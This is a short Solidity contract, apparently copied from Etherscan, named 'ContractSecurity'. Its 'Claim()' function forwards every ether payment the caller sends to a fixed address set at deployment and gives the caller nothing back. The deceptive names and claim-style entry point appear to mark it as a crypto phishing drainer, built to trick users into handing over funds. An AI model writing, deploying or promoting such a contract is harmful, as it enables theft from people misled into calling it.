/**
 *Submitted for verification at Etherscan.io on 2023-07-10
*/

contract ContractSecurity {
    address to;

    constructor(address _to)
    {
        to=_to;
    }

    function Claim() public payable {
        to.call{value: msg.value}("");
    }
}